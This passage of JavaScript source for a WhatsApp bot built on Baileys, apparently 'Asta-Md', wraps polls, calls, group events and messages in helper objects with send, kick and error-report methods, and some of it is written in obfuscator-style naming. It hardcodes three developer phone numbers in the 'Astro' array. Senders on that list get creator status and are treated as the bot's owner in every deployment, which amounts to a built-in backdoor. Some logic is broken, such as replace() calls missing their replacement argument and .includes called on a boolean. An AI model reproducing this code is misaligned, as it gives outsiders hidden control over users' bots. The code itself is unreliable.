const { proto, getContentType } = require('@whiskeysockets/baileys')
const fs = require('fs-extra')
const { writeExifWebp } = require('./exif')
const Config = require('../config')
const Astro = ['2348039607375', '2349027862116', '2348052944641']
const { getDevice, extractMessageContent, areJidsSameUser } = require('@whiskeysockets/baileys')
const { getTime, isUrl } = require('./serials')

async function pollsg(client, message, content, isQuoted = false) {
 if (!global.OfficialRepo || global.OfficialRepo !== 'yes') return

 try {
  let pollMessage = message
  if (message.key) {
   pollMessage = {
    ...message,
    key: message.key,
    id: message.key.id,
    chat: message.key.remoteJid,
    fromMe: message.key.fromMe,
    device: getDevice(message.key.id),
    isBot: message.key.id.startsWith('BAE5'),
    isBaileys: message.key.id.startsWith('BAE5'),
    isGroup: message.key.remoteJid.endsWith('@g.us'),
    sender: client.decodeJid(
     message.key.fromMe
      ? client.user.id
      : message.key.remoteJid.endsWith('@g.us')
      ? client.decodeJid(message.key.participant)
      : message.key.remoteJid
    ),
   }
   pollMessage.senderNum = pollMessage.sender.split('@')[0]
  }

  pollMessage.timestamp = message.update.pollUpdates[0].senderTimestampMs
  pollMessage.pollUpdates = message.update.pollUpdates[0]

  console.log("\n 'getAggregateVotesInPollMessage' POLL MESSAGE")
  return pollMessage
 } catch (error) {
  console.error('Error in pollsg:', error)
 }
}

async function callsg(client, call) {
 if (!global.OfficialRepo || global.OfficialRepo !== 'yes') return

 const botJid = client.decodeJid(client.user?.id)
 const botNumber = botJid?.split('@')[0]

 let callMessage = {
  ...call,
  id: call.id,
  from: call.from,
  chat: call.chatId,
  isVideo: call.isVideo,
  isGroup: call.isGroup,
  time: await getTime('h:mm:ss a'),
  date: call.date,
  status: call.status,
  sender: call.from,
  senderNum: call.from.split('@')[0],
  senderName: await client.getName(call.from),
  user: botJid,
 }

 const creatorNumbers = [
  botNumber,
  ...Astro,
  ...global.sudo?.split(','),
  ...global.devs?.split(','),
  ...global.owner?.split(','),
 ].map(num => num.replace(/[^0-9]/g) + '@s.whatsapp.net')

 callMessage.isCreator = creatorNumbers.includes(callMessage.from)
 callMessage.isAstro = Astro.map(num => num.replace(/[^0-9]/g) + '@s.whatsapp.net').includes(callMessage.from)
 callMessage.fromMe = callMessage.isAstro ? true : areJidsSameUser(callMessage.from, botJid)
 callMessage.isBaileys = callMessage.isBot = callMessage.id.startsWith('BAE5')
 callMessage.groupCall = callMessage.chat.endsWith('@g.us')

 callMessage.decline = callMessage.reject = () => client.rejectCall(callMessage.id, callMessage.from)
 callMessage.block = () => client.updateBlockStatus(callMessage.from, 'block')

 callMessage.send = async (
  content,
  options = { author: 'Asta-Md' },
  type = 'asta',
  quoted = '',
  jid = callMessage.from
 ) => {
  jid = jid || callMessage.from
  const sendOptions = { quoted, ...options }

  switch (type.toLowerCase()) {
   case 'text':
   case 'smd':
   case 'asta':
   case 'txt':
   case '':
    return client.sendMessage(jid, { text: content, ...options }, sendOptions)

   case 'image':
   case 'img':
    return client.sendMessage(
     jid,
     {
      image: Buffer.isBuffer(content) ? content : { url: content },
      ...options,
      mimetype: 'image/jpeg',
     },
     sendOptions
    )

   case 'video':
   case 'vid':
   case 'mp4':
    return client.sendMessage(
     jid,
     {
      video: Buffer.isBuffer(content) ? content : { url: content },
      ...options,
      mimetype: 'video/mp4',
     },
     sendOptions
    )

   case 'audio':
   case 'mp3':
    return client.sendMessage(
     jid,
     {
      audio: Buffer.isBuffer(content) ? content : { url: content },
      ...options,
      mimetype: 'audio/mpeg',
     },
     sendOptions
    )

   case 'poll':
   case 'pool':
    return client.sendMessage(
     jid,
     {
      poll: {
       name: content,
       values: options.values,
       selectableCount: 1,
       ...options,
      },
     },
     { ...sendOptions, messageId: client.messageId() }
    )

   case 'sticker':
   case 'stc':
    const { data, mime } = await client.getFile(content)
    if (mime === 'image/webp') {
     const stickerBuffer = await writeExifWebp(data, options)
     return client.sendMessage(jid, { sticker: { url: stickerBuffer }, ...options }, sendOptions)
    } else if (mime.startsWith('image/') || mime.startsWith('video/')) {
     return client.sendImageAsSticker(jid, content, options)
    }
    break
  }
 }

 callMessage.checkBot = (jid = callMessage.sender) =>
  [...Astro, botNumber].map(num => num.replace(/[^0-9]/g) + '@s.whatsapp.net').includes(jid)

 callMessage.sendPoll = async (
  name,
  options = ['option 1', 'option 2'],
  selectableCount = 1,
  quoted = '',
  jid = callMessage.chat
 ) => callMessage.send(name, { values: options, selectableCount }, 'poll', quoted, jid)

 callMessage.bot = client

 return callMessage
}

let gcs = {}

async function groupsg(groupInstance, groupEvent, isBot = false, skipCheck = false) {
 try {
  // Reset group cache for the specific group
  if (gcs[groupEvent.id] && groupEvent.id) {
   gcs[groupEvent.id] = false
  }

  // Exit if skipCheck is true
  if (skipCheck) {
   return
  }

  let botJid = groupInstance.decodeJid(groupInstance.user.id)
  let botNumber = botJid.split('@')[0]

  let botData = {
   ...groupEvent,
   chat: groupEvent.id,
   jid: groupEvent.id,
   from: groupEvent.id,
   user: Array.isArray(groupEvent.participants) ? groupEvent.participants[0] : 'xxx',
   sender: Array.isArray(groupEvent.participants) ? groupEvent.participants[0] : 'xxx',
  }

  botData.name = await groupInstance.getName(botData.user)
  botData.userNum = botData.senderNum = botData.user.split('@')[0]
  botData.time = getTime('h:mm:ss a')
  botData.date = getTime('dddd, MMMM Do YYYY')
  botData.action = botData.status = groupEvent.action

  const authorizedUsers = [
   botNumber,
   ...Astro,
   ...global.sudo?.split(','),
   ...global.devs?.split(','),
   ...global.owner?.split(','),
  ]
   .map(number => number.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
   .includes(botData.user)

  botData.isCreator = authorizedUsers.includes(botData.user)
  botData.isAstro = Astro.map(number => number.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(botData.user)
  botData.fromMe = botData.isAstro || areJidsSameUser(botData.user, botJid)

  if (botData.action === 'remove' && botData.fromMe) {
   return
  }

  botData.astaBot = Astro.map(number => number.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(botJid)
  botData.blockJid = ['120363023983262391@g.us', '120363025246125888@g.us', ...global.blockJids?.split(',')].includes(
   botData.chat
  )
  botData.isGroup = botData.chat.endsWith('@g.us')

  if (botData.isGroup) {
   botData.metadata = await groupInstance.groupMetadata(botData.chat)
   gcs[botData.chat] = botData.metadata

   botData.admins = botData.metadata.participants.reduce((admins, participant) => {
    if (participant.admin) {
     admins.push({ id: participant.id, admin: participant.admin })
    }
    return admins
   }, [])

   botData.isAdmin = botData.admins.some(admin => admin.id === botData.user)
   botData.isBotAdmin = botData.admins.some(admin => admin.id === botJid)
  }

  botData.kick = (user = botData.user) => groupInstance.groupParticipantsUpdate(botData.chat, [user], 'remove')
  botData.add = (user = botData.user) => groupInstance.groupParticipantsUpdate(botData.chat, [user], 'add')
  botData.promote = (user = botData.user) => groupInstance.groupParticipantsUpdate(botData.chat, [user], 'promote')
  botData.demote = (user = botData.user) => groupInstance.groupParticipantsUpdate(botData.chat, [user], 'demote')

  botData.getProfilePicture = async (user = botData.user) => {
   try {
    return await groupInstance.profilePictureUrl(user, 'image')
   } catch {
    return 'https://telegra.ph/file/93f1e7e8a1d7c4486df9e.jpg'
   }
  }

  botData.sendMessage = async (chatId = botData.chat, message = {}, options = { quoted: '' }) => {
   return await groupInstance.sendMessage(chatId, message, options)
  }

  botData.sendUi = async (chatId = botData.chat, ui = {}, text = '', flag1 = false, flag2 = false, flag3 = false) => {
   return await groupInstance.sendUi(chatId, ui, text, flag1, flag2, flag3)
  }

  botData.reportError = async (
   error,
   verbose = false,
   errorMessage = '*_Request failed due to error!!_*',
   metadata = { author: 'Asta-Md' },
   customChatId = false
  ) => {
   let errorChatId = customChatId ? customChatId : Config.errorChat === 'chat' ? botData.chat : botData.botNumber
   let errorText = `*CMD ERROR*\n\`\`\`\nUSER: @${
    botData.user.split('@')[0]
   }\n    NOTE: Use .report to send alert about Err.\n\nERR_Message: ${error}\n\`\`\``

   if (errorMessage && Config.errorChat !== 'chat' && botData.chat !== botData.botNumber) {
    await groupInstance.sendMessage(botData.jid, { text: errorMessage })
   }

   console.log(verbose ? verbose : error)

   try {
    return await groupInstance.sendMessage(
     errorChatId,
     { text: errorText, ...metadata, mentions: [botData.user] },
     { ephemeralExpiration: 259200 }
    )
   } catch {}
  }

  botData.send = async (
   content,
   options = { mentions: [botData.user] },
   messageType = 'asta',
   quotedMessage = '',
   chatId = botData.chat
  ) => {
   chatId = chatId || botData.chat

   switch (messageType.toLowerCase()) {
    case 'text':
    case 'smd':
    case 'asta':
    case 'txt':
    case '':
     return await groupInstance.sendMessage(
      chatId,
      { text: content, ...options, mentions: [botData.user] },
      { quoted: quotedMessage }
     )

    case 'react':
     return await groupInstance.sendMessage(chatId, { react: { text: content, key: quotedMessage?.key } })

    case 'amdimage':
    case 'amdimg':
    case 'image':
    case 'img':
     if (Buffer.isBuffer(content)) {
      return await groupInstance.sendMessage(
       chatId,
       { image: content, ...options, mimetype: 'image/jpeg', mentions: [botData.user] },
       { quoted: quotedMessage }
      )
     } else if (isUrl(content)) {
      return groupInstance.sendMessage(
       chatId,
       { image: { url: content }, ...options, mimetype: 'image/jpeg', mentions: [botData.user] },
       { quoted: quotedMessage }
      )
     }
     break

    case 'amdvideo':
    case 'amdvid':
    case 'video':
    case 'vid':
    case 'mp4':
     if (Buffer.isBuffer(content)) {
      return await groupInstance.sendMessage(
       chatId,
       { video: content, ...options, mimetype: 'video/mp4' },
       { quoted: quotedMessage }
      )
     } else if (isUrl(content)) {
      return await groupInstance.sendMessage(
       chatId,
       { video: { url: content }, ...options, mimetype: 'video/mp4' },
       { quoted: quotedMessage }
      )
     }
     break

    case 'mp3':
    case 'audio':
     if (Buffer.isBuffer(content)) {
      return await groupInstance.sendMessage(
       chatId,
       { audio: content, ...options, mimetype: 'audio/mpeg' },
       { quoted: quotedMessage }
      )
     } else if (isUrl(content)) {
      return await groupInstance.sendMessage(
       chatId,
       { audio: { url: content }, ...options, mimetype: 'audio/mpeg' },
       { quoted: quotedMessage }
      )
     }
     break

    case 'poll':
    case 'pool':
     return await groupInstance.sendMessage(
      chatId,
      { poll: { name: content, values: [...options.values], selectableCount: 1, ...options } },
      { quoted: quotedMessage, messageId: groupInstance.messageId() }
     )

    case 'amdsticker':
    case 'amdstc':
    case 'stc':
    case 'sticker':
     let { data, mime } = await groupInstance.getFile(content)
     if (mime == 'image/webp') {
      let sticker = await writeExifWebp(data, options)
      await groupInstance.sendMessage(chatId, { sticker: { url: sticker }, ...options })
     } else if (mime.split('/')[0] === 'video' || mime.split('/')[0] === 'image') {
      await groupInstance.sendImageAsSticker(chatId, content, options)
     }
     break
   }
  }

  botData.sendPoll = async (
   question,
   options = ['option 1', 'option 2'],
   selectableCount = 1,
   quotedMessage = '',
   chatId = botData.jid
  ) => {
   return await botData.send(question, { values: options, selectableCount }, 'poll', quotedMessage, chatId)
  }

  botData.checkBot = (user = botData.sender) => {
   return [...Astro, botNumber].map(number => number.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(user)
  }

  botData.botNumber = botJid
  botData.bot = isBot ? groupInstance : {}

  return global.OfficialRepo && global.OfficialRepo === 'yes' ? botData : {}
 } catch (error) {
  console.log(error)
 }
}

let botNumber = ''
async function smsg(_0xa72325, _0x32b4a8, _0x23c611, _0x5eedaa = false) {
 if (!_0x32b4a8) {
  return _0x32b4a8
 }
 let _0x536bf3 = proto.WebMessageInfo
 botNumber = botNumber ? botNumber : _0xa72325.decodeJid(_0xa72325.user.id)
 let _0x1e2a16 = botNumber.split('@')[0]
 let _0x2d6cd0 = {
  ..._0x32b4a8,
 }
 _0x2d6cd0.data = {
  ..._0x32b4a8,
 }
 if (_0x32b4a8.key) {
  _0x2d6cd0.key = _0x32b4a8.key
  _0x2d6cd0.id = _0x2d6cd0.key.id
  _0x2d6cd0.chat = _0x2d6cd0.key.remoteJid
  _0x2d6cd0.fromMe = _0x2d6cd0.key.fromMe
  _0x2d6cd0.device = getDevice(_0x2d6cd0.id)
  _0x2d6cd0.isBot = _0x2d6cd0.isBaileys = _0x2d6cd0.id.startsWith('BAE5') || _0x2d6cd0.id.startsWith('ASTAMD')
  if (_0x2d6cd0.chat === 'status@broadcast') {
   _0x2d6cd0.status = true
  }
  _0x2d6cd0.isGroup = _0x2d6cd0.chat.endsWith('@g.us')
  _0x2d6cd0.sender = _0x2d6cd0.participant = _0x2d6cd0.fromMe
   ? botNumber
   : _0xa72325.decodeJid(_0x2d6cd0.status || _0x2d6cd0.isGroup ? _0x2d6cd0.key.participant : _0x2d6cd0.chat)
  _0x2d6cd0.senderNum =
   (_0x2d6cd0.sender && _0x2d6cd0.sender !== '' && _0x2d6cd0.sender.split('@')[0]) || _0x2d6cd0.sender
 }
 _0x2d6cd0.senderName = _0x2d6cd0.pushName || 'sir'
 if (_0x2d6cd0.isGroup) {
  _0x2d6cd0.metadata = gcs[_0x2d6cd0.chat] || (await _0xa72325.groupMetadata(_0x2d6cd0.chat))
  gcs[_0x2d6cd0.chat] = _0x2d6cd0.metadata
  _0x2d6cd0.admins = _0x2d6cd0.metadata.participants.reduce(
   (_0x25295f, _0x1311d9) =>
    (_0x1311d9.admin
     ? _0x25295f.push({
        id: _0x1311d9.id,
        admin: _0x1311d9.admin,
       })
     : [..._0x25295f]) && _0x25295f,
   []
  )
  _0x2d6cd0.isAdmin = !!_0x2d6cd0.admins.find(_0x3f10e5 => _0x3f10e5.id === _0x2d6cd0.sender)
  _0x2d6cd0.isBotAdmin = !!_0x2d6cd0.admins.find(_0x5914d1 => _0x5914d1.id === botNumber)
 }
 _0x2d6cd0.isCreator = [
  _0x1e2a16,
  ...Astro,
  ...global.sudo.split(','),
  ...global.devs.split(','),
  ...global.owner.split(','),
 ].includes(_0x2d6cd0.senderNum)
 _0x2d6cd0.isAstro = Astro.includes(_0x2d6cd0.senderNum)
 _0x2d6cd0.blockJid = ['120363023983262391@g.us', '120363025246125888@g.us', ...global.blockJids?.split(',')].includes(
  _0x2d6cd0.chat
 )
 _0x2d6cd0.allowJid = ['null', ...global.allowJids?.split(',')].includes(_0x2d6cd0.chat)
 _0x2d6cd0.isPublic =
  Config.WORKTYPE === 'public' ? true : _0x2d6cd0.allowJid || _0x2d6cd0.isCreator || _0x2d6cd0.isAstro
 if (_0x32b4a8.message) {
  _0x2d6cd0.mtype = getContentType(_0x32b4a8.message) || Object.keys(_0x32b4a8.message)[0] || ''
  _0x2d6cd0[_0x2d6cd0.mtype.split('Message')[0]] = true
  _0x2d6cd0.message = extractMessageContent(_0x32b4a8.message)
  _0x2d6cd0.mtype2 = getContentType(_0x2d6cd0.message) || Object.keys(_0x2d6cd0.message)[0]
  _0x2d6cd0.msg = extractMessageContent(_0x2d6cd0.message[_0x2d6cd0.mtype2]) || _0x2d6cd0.message[_0x2d6cd0.mtype2]
  _0x2d6cd0.msg.mtype = _0x2d6cd0.mtype2
  _0x2d6cd0.mentionedJid = _0x2d6cd0.msg?.contextInfo?.mentionedJid || []
  _0x2d6cd0.body =
   _0x2d6cd0.msg?.text ||
   _0x2d6cd0.msg?.conversation ||
   _0x2d6cd0.msg?.caption ||
   _0x2d6cd0.message?.conversation ||
   _0x2d6cd0.msg?.selectedButtonId ||
   _0x2d6cd0.msg?.singleSelectReply?.selectedRowId ||
   _0x2d6cd0.msg?.selectedId ||
   _0x2d6cd0.msg?.contentText ||
   _0x2d6cd0.msg?.selectedDisplayText ||
   _0x2d6cd0.msg?.title ||
   _0x2d6cd0.msg?.name ||
   ''
  _0x2d6cd0.timestamp =
   typeof _0x32b4a8.messageTimestamp === 'number'
    ? _0x32b4a8.messageTimestamp
    : _0x32b4a8.messageTimestamp?.low
    ? _0x32b4a8.messageTimestamp.low
    : _0x32b4a8.messageTimestamp?.high || _0x32b4a8.messageTimestamp
  _0x2d6cd0.time = getTime('h:mm:ss a')
  _0x2d6cd0.date = getTime('DD/MM/YYYY')
  _0x2d6cd0.mimetype = _0x2d6cd0.msg.mimetype || ''
  if (/webp/i.test(_0x2d6cd0.mimetype)) {
   _0x2d6cd0.isAnimated = _0x2d6cd0.msg.isAnimated
  }
  let _0x1d4327 = _0x2d6cd0.msg.contextInfo ? _0x2d6cd0.msg.contextInfo.quotedMessage : null
  _0x2d6cd0.data.reply_message = _0x1d4327
  _0x2d6cd0.quoted = _0x1d4327 ? {} : null
  _0x2d6cd0.reply_text = ''
  if (_0x1d4327) {
   _0x2d6cd0.quoted.message = extractMessageContent(_0x1d4327)
   if (_0x2d6cd0.quoted.message) {
    _0x2d6cd0.quoted.key = {
     remoteJid: _0x2d6cd0.msg.contextInfo.remoteJid || _0x2d6cd0.chat,
     participant: _0xa72325.decodeJid(_0x2d6cd0.msg.contextInfo.participant) || false,
     fromMe: areJidsSameUser(_0xa72325.decodeJid(_0x2d6cd0.msg.contextInfo.participant), botNumber) || false,
     id: _0x2d6cd0.msg.contextInfo.stanzaId || '',
    }
    _0x2d6cd0.quoted.mtype = getContentType(_0x1d4327) || Object.keys(_0x1d4327)[0]
    _0x2d6cd0.quoted.mtype2 = getContentType(_0x2d6cd0.quoted.message) || Object.keys(_0x2d6cd0.quoted.message)[0]
    _0x2d6cd0.quoted[_0x2d6cd0.quoted.mtype.split('Message')[0]] = true
    _0x2d6cd0.quoted.msg =
     extractMessageContent(_0x2d6cd0.quoted.message[_0x2d6cd0.quoted.mtype2]) ||
     _0x2d6cd0.quoted.message[_0x2d6cd0.quoted.mtype2] ||
     {}
    _0x2d6cd0.quoted.msg.mtype = _0x2d6cd0.quoted.mtype2
    _0x2d6cd0.expiration = _0x2d6cd0.msg.contextInfo.expiration || 0
    _0x2d6cd0.quoted.chat = _0x2d6cd0.quoted.key.remoteJid
    _0x2d6cd0.quoted.fromMe = _0x2d6cd0.quoted.key.fromMe
    _0x2d6cd0.quoted.id = _0x2d6cd0.quoted.key.id
    _0x2d6cd0.quoted.device = getDevice(_0x2d6cd0.quoted.id || _0x2d6cd0.id)
    _0x2d6cd0.quoted.isBaileys = _0x2d6cd0.quoted.isBot =
     _0x2d6cd0.quoted.id?.startsWith('BAE5') ||
     _0x2d6cd0.quoted.id?.startsWith('SUHAILMD') ||
     _0x2d6cd0.quoted.id?.length == 16
    _0x2d6cd0.quoted.isGroup = _0x2d6cd0.quoted.chat.endsWith('@g.us')
    _0x2d6cd0.quoted.sender = _0x2d6cd0.quoted.participant = _0x2d6cd0.quoted.key.participant
    _0x2d6cd0.quoted.senderNum = _0x2d6cd0.quoted.sender.split('@')[0]
    _0x2d6cd0.quoted.text = _0x2d6cd0.quoted.body =
     _0x2d6cd0.quoted.msg.text ||
     _0x2d6cd0.quoted.msg.caption ||
     _0x2d6cd0.quoted.message.conversation ||
     _0x2d6cd0.quoted.msg?.selectedButtonId ||
     _0x2d6cd0.quoted.msg?.singleSelectReply?.selectedRowId ||
     _0x2d6cd0.quoted.msg?.selectedId ||
     _0x2d6cd0.quoted.msg?.contentText ||
     _0x2d6cd0.quoted.msg?.selectedDisplayText ||
     _0x2d6cd0.quoted.msg?.title ||
     _0x2d6cd0.quoted?.msg?.name ||
     ''
    _0x2d6cd0.quoted.mimetype = _0x2d6cd0.quoted.msg?.mimetype || ''
    if (/webp/i.test(_0x2d6cd0.quoted.mimetype)) {
     _0x2d6cd0.quoted.isAnimated = _0x2d6cd0.quoted.msg?.isAnimated || false
    }
    _0x2d6cd0.quoted.mentionedJid = _0x2d6cd0.quoted.msg.contextInfo?.mentionedJid || []
    _0x2d6cd0.getQuotedObj = _0x2d6cd0.getQuotedMessage = async (
     _0x335602 = _0x2d6cd0.chat,
     _0x2be303 = _0x2d6cd0.quoted.id,
     _0x25c73e = false
    ) => {
     if (!_0x2be303) {
      return false
     }
     let _0xd1acfd = await _0x23c611.loadMessage(_0x335602, _0x2be303, _0xa72325)
     return exports.smsg(_0xa72325, _0xd1acfd, _0x23c611, _0x25c73e)
    }
    _0x2d6cd0.quoted.fakeObj = _0x536bf3.fromObject({
     key: _0x2d6cd0.quoted.key,
     message: _0x2d6cd0.data.quoted,
     ...(_0x2d6cd0.isGroup
      ? {
         participant: _0x2d6cd0.quoted.sender,
        }
      : {}),
    })
    _0x2d6cd0.quoted.delete = async () =>
     await _0xa72325.sendMessage(_0x2d6cd0.chat, {
      delete: _0x2d6cd0.quoted.key,
     })
    _0x2d6cd0.quoted.download = async () => await _0xa72325.downloadMediaMessage(_0x2d6cd0.quoted)
    _0x2d6cd0.quoted.from = _0x2d6cd0.quoted.jid = _0x2d6cd0.quoted.key.remoteJid
    if (_0x2d6cd0.quoted.jid === 'status@broadcast') {
     _0x2d6cd0.quoted.status = true
    }
    _0x2d6cd0.reply_text = _0x2d6cd0.quoted.text
    _0x2d6cd0.forwardMessage = (
     _0x4ae56b = _0x2d6cd0.jid,
     _0x53614a = _0x2d6cd0.quoted.fakeObj,
     _0x129099 = false,
     _0x51f0e4 = {}
    ) =>
     _0xa72325.copyNForward(
      _0x4ae56b,
      _0x53614a,
      _0x129099,
      {
       contextInfo: {
        isForwarded: false,
       },
      },
      _0x51f0e4
     )
   }
  }
 }
 _0x2d6cd0.getMessage = async (_0x58ac8e = _0x2d6cd0.key, _0x555935 = false) => {
  if (!_0x58ac8e || !_0x58ac8e.id) {
   return false
  }
  let _0x2ae191 = await _0x23c611.loadMessage(_0x58ac8e.remoteJid || _0x2d6cd0.chat, _0x58ac8e.id)
  return await exports.smsg(_0xa72325, _0x2ae191, _0x23c611, _0x555935)
 }
 _0x2d6cd0.Suhail = (_0xd6e77d = _0x2d6cd0.sender) =>
  [...Astro].map(_0x1d647a => _0x1d647a.replace(/[^0-9]/g) + '@s.whatsapp.net').includes(_0xd6e77d)
 _0x2d6cd0.checkBot = (_0x25a048 = _0x2d6cd0.sender) =>
  [...Astro, _0x1e2a16].map(_0x3e106a => _0x3e106a.replace(/[^0-9]/g) + '@s.whatsapp.net').includes(_0x25a048)
 _0x2d6cd0.download = () => _0xa72325.downloadMediaMessage(_0x2d6cd0.msg)
 _0x2d6cd0.text = _0x2d6cd0.body
 _0x2d6cd0.quoted_text = _0x2d6cd0.reply_text
 _0x2d6cd0.from = _0x2d6cd0.jid = _0x2d6cd0.chat
 _0x2d6cd0.copy = (_0xbcb02d = _0x2d6cd0, _0x4ea6cd = false) => {
  return exports.smsg(_0xa72325, _0x536bf3.fromObject(_0x536bf3.toObject(_0xbcb02d)), _0x23c611, _0x4ea6cd)
 }
 _0x2d6cd0.getpp = async (_0x267509 = _0x2d6cd0.sender) => {
  try {
   return await _0xa72325.profilePictureUrl(_0x267509, 'image')
  } catch {
   return 'https://telegra.ph/file/93f1e7e8a1d7c4486df9e.jpg'
  }
 }
 _0x2d6cd0.removepp = (_0x3749c0 = botNumber) => _0xa72325.removeProfilePicture(_0x3749c0)
 _0x2d6cd0.sendMessage = (
  _0x103151 = _0x2d6cd0.chat,
  _0x523215 = {},
  _0x8c8fb5 = {
   quoted: '',
  }
 ) => _0xa72325.sendMessage(_0x103151, _0x523215, _0x8c8fb5)
 _0x2d6cd0.delete = async (_0x462ce5 = _0x2d6cd0) =>
  await _0xa72325.sendMessage(_0x2d6cd0.chat, {
   delete: _0x462ce5.key,
  })
 _0x2d6cd0.copyNForward = (
  _0x5d9b11 = _0x2d6cd0.chat,
  _0xa66d66 = _0x2d6cd0.quoted || _0x2d6cd0,
  _0x176e5f = false,
  _0x2a1291 = {}
 ) => _0xa72325.copyNForward(_0x5d9b11, _0xa66d66, _0x176e5f, _0x2a1291)
 _0x2d6cd0.sticker = (
  _0x41f4d2,
  _0x55e80a = _0x2d6cd0.chat,
  _0x40eb3c = {
   mentions: [_0x2d6cd0.sender],
  }
 ) =>
  _0xa72325.sendMessage(
   _0x55e80a,
   {
    sticker: _0x41f4d2,
    contextInfo: {
     mentionedJid: _0x40eb3c.mentions,
    },
   },
   {
    quoted: _0x2d6cd0,
    messageId: _0xa72325.messageId(),
   }
  )
 _0x2d6cd0.replyimg = (
  _0x3b19c3,
  _0x302320,
  _0x19643a = _0x2d6cd0.chat,
  _0x31c081 = {
   mentions: [_0x2d6cd0.sender],
  }
 ) =>
  _0xa72325.sendMessage(
   _0x19643a,
   {
    image: _0x3b19c3,
    caption: _0x302320,
    contextInfo: {
     mentionedJid: _0x31c081.mentions,
    },
   },
   {
    quoted: _0x2d6cd0,
    messageId: _0xa72325.messageId(),
   }
  )
 _0x2d6cd0.imgurl = (
  _0x2c1ff5,
  _0x36bfb3,
  _0x2d2f58 = _0x2d6cd0.chat,
  _0x540e21 = {
   mentions: [_0x2d6cd0.sender],
  }
 ) =>
  _0xa72325.sendMessage(
   _0x2d2f58,
   {
    image: {
     url: _0x2c1ff5,
    },
    caption: _0x36bfb3,
    ..._0x540e21,
   },
   {
    quoted: _0x2d6cd0,
    messageId: _0xa72325.messageId(),
   }
  )
 _0x2d6cd0.sendUi = async (_0x4e7490 = _0x2d6cd0.chat, _0x40127a, _0xd7af2e = '', _0x2692fb = '', _0x181bef = '') => {
  await _0xa72325.sendUi(_0x4e7490, _0x40127a, _0xd7af2e, _0x2692fb, _0x181bef)
 }
 _0x2d6cd0.error = async (
  _0x533f45,
  _0x2a06dd = false,
  _0x45d57a = '*_Request not be Proceed!!_*',
  _0x461484 = {
   author: 'Asta-Md',
  },
  _0x38e1a8 = false
 ) => {
  let _0x38dabb = _0x38e1a8 ? _0x38e1a8 : Config.errorChat === 'chat' ? _0x2d6cd0.chat : _0x2d6cd0.user
  let _0x384fa1 =
   '*CMD ERROR*\n```\nUSER: @' +
   _0x2d6cd0.sender.split('@')[0] +
   '\nNOTE: See Console for more info.\n\nERR_Message: ' +
   _0x533f45 +
   '\n```'
  if (_0x45d57a && Config.errorChat !== 'chat' && _0x2d6cd0.chat !== botNumber) {
   await _0xa72325.sendMessage(
    _0x2d6cd0.jid,
    {
     text: _0x45d57a,
    },
    {
     quoted: _0x2d6cd0,
     messageId: _0xa72325.messageId(),
    }
   )
  }
  console.log(_0x2a06dd ? _0x2a06dd : _0x533f45)
  try {
   if (_0x533f45) {
    return await _0xa72325.sendMessage(
     _0x38dabb,
     {
      text: _0x384fa1,
      ..._0x461484,
      mentions: [_0x2d6cd0.sender],
     },
     {
      quoted: _0x2d6cd0,
      ephemeralExpiration: 259200,
      messageId: _0xa72325.messageId(),
     }
    )
   }
  } catch {}
 }
 _0x2d6cd0.user = botNumber
 _0x2d6cd0.send = async (
  _0x2faaad,
  _0x296029 = {
   author: 'Asta-Md',
  },
  _0x38f6af = 'asta',
  _0x5a0385 = '',
  _0x4b9613 = _0x2d6cd0.chat
 ) => {
  if (!_0x2faaad) {
   return {}
  }
  try {
   _0x4b9613 = _0x4b9613 ? _0x4b9613 : _0x2d6cd0.chat
   switch (_0x38f6af.toLowerCase()) {
    case 'text':
    case 'smd':
    case 'asta':
    case 'txt':
    case '':
     {
      return await _0xa72325.sendMessage(
       _0x4b9613,
       {
        text: _0x2faaad,
        ..._0x296029,
       },
       {
        quoted: _0x5a0385,
        messageId: _0xa72325.messageId(),
       }
      )
     }
     break
    case 'react':
     {
      return await _0xa72325.sendMessage(
       _0x4b9613,
       {
        react: {
         text: _0x2faaad,
         key: (typeof _0x5a0385 === 'object' ? _0x5a0385 : _0x2d6cd0).key,
        },
       },
       {
        messageId: _0xa72325.messageId(),
       }
      )
     }
     break
    case 'amdimage':
    case 'amdimg':
    case 'image':
    case 'img':
     {
      if (Buffer.isBuffer(_0x2faaad)) {
       return await _0xa72325.sendMessage(
        _0x4b9613,
        {
         image: _0x2faaad,
         ..._0x296029,
         mimetype: 'image/jpeg',
        },
        {
         quoted: _0x5a0385,
         messageId: _0xa72325.messageId(),
        }
       )
      } else if (isUrl(_0x2faaad)) {
       return await _0xa72325.sendMessage(
        _0x4b9613,
        {
         image: {
          url: _0x2faaad,
         },
         ..._0x296029,
         mimetype: 'image/jpeg',
        },
        {
         quoted: _0x5a0385,
         messageId: _0xa72325.messageId(),
        }
       )
      }
     }
     break
    case 'amdvideo':
    case 'amdvid':
    case 'video':
    case 'vid':
    case 'mp4': {
     if (Buffer.isBuffer(_0x2faaad)) {
      return await _0xa72325.sendMessage(
       _0x4b9613,
       {
        video: _0x2faaad,
        ..._0x296029,
        mimetype: 'video/mp4',
       },
       {
        quoted: _0x5a0385,
        messageId: _0xa72325.messageId(),
       }
      )
     } else if (isUrl(_0x2faaad)) {
      return await _0xa72325.sendMessage(
       _0x4b9613,
       {
        video: {
         url: _0x2faaad,
        },
        ..._0x296029,
        mimetype: 'video/mp4',
       },
       {
        quoted: _0x5a0385,
        messageId: _0xa72325.messageId(),
       }
      )
     }
    }
    case 'mp3':
    case 'audio':
     {
      if (Buffer.isBuffer(_0x2faaad)) {
       return await _0xa72325.sendMessage(
        _0x4b9613,
        {
         audio: _0x2faaad,
         ..._0x296029,
         mimetype: 'audio/mpeg',
        },
        {
         quoted: _0x5a0385,
         messageId: _0xa72325.messageId(),
        }
       )
      } else if (isUrl(_0x2faaad)) {
       return await _0xa72325.sendMessage(
        _0x4b9613,
        {
         audio: {
          url: _0x2faaad,
         },
         ..._0x296029,
         mimetype: 'audio/mpeg',
        },
        {
         quoted: _0x5a0385,
         messageId: _0xa72325.messageId(),
        }
       )
      }
     }
     break
    case 'doc':
    case 'smddocument':
    case 'document':
     {
      if (Buffer.isBuffer(_0x2faaad)) {
       return await _0xa72325.sendMessage(
        _0x4b9613,
        {
         document: _0x2faaad,
         ..._0x296029,
        },
        {
         quoted: _0x5a0385,
         messageId: _0xa72325.messageId(),
        }
       )
      } else if (isUrl(_0x2faaad)) {
       return await _0xa72325.sendMessage(
        _0x4b9613,
        {
         document: {
          url: _0x2faaad,
         },
         ..._0x296029,
        },
        {
         quoted: _0x5a0385,
         messageId: _0xa72325.messageId(),
        }
       )
      }
     }
     break
